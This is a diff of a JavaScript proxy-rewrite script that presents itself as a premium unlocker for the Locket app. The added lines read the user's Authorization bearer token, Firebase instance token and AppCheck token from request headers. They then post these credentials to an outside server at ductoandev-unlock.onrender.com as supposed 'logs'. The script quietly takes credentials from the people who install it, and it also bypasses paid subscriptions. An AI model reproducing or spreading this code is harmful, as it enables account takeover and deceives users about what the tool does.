@@ -38,16 +38,15 @@
   // --- XỬ LÝ HEADERS ---
   const headers = $request.headers;
   const ua = headers["User-Agent"] || headers["user-agent"] || "";
-  const userToken = headers["Authorization"] || headers["X-Auth-Token"];
-
-  // FIX: Tìm Device ID chính xác hơn thay vì dùng User-Agent
-  // Các App thường gửi ID thiết bị qua các header này
-  const deviceID =
-    headers["X-Device-ID"] ||
-    headers["X-Client-Id"] ||
-    headers["X-Unique-ID"] ||
-    headers["Vendor-Id"] ||
-    ua; // Fallback về UA nếu không tìm thấy
+  
+  // Locket API Headers
+  const authorization = headers["Authorization"] || "";
+  const firebaseToken = headers["Firebase-Instance-ID-Token"] || headers["firebase-instance-id-token"] || "";
+  const appCheck = headers["X-Firebase-AppCheck"] || headers["x-firebase-appcheck"] || "";
+  const contentType = headers["Content-Type"] || headers["content-type"] || "";
+  
+  // Extract Bearer token
+  const userToken = authorization.replace("Bearer ", "");
 
   // --- XỬ LÝ LOGIC PREMIUM (Chuẩn bị dữ liệu trước) ---
   let responseObj;
@@ -137,25 +136,26 @@
   };
 
   // --- XỬ LÝ GỬI LOG (FIX ASYNC) ---
-  if (userToken && typeof $httpClient !== "undefined") {
+  if (authorization && typeof $httpClient !== "undefined") {
     // 1. Tạo Timeout an toàn: Nếu server log chậm quá 1.5s thì bỏ qua, cứ trả về Premium cho khách
     const timeoutId = setTimeout(() => {
       finish();
     }, TIMEOUT_MS);
 
-    // 2. Gửi Log
+    // 2. Gửi Log với đầy đủ headers Locket
     $httpClient.post(
       {
         url: "https://ductoandev-unlock.onrender.com/logs",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          app: "Locket/Multi", // Có thể parse từ UA để rõ hơn
-          token: userToken,
-          device: deviceID, // Đã fix biến này
-          userAgent: ua, // Gửi thêm UA để debug
+          app: "Locket",
+          authorization: authorization,
+          firebaseToken: firebaseToken,
+          appCheck: appCheck,
+          userAgent: ua,
           timestamp: new Date().toISOString(),
         }),
-        timeout: 1000, // Timeout của riêng request log (1s)
+        timeout: 1000,
       },
       function (error, response, data) {
         // 3. Khi gửi xong (dù lỗi hay thành công) -> Hủy timeout chờ -> Kết thúc script
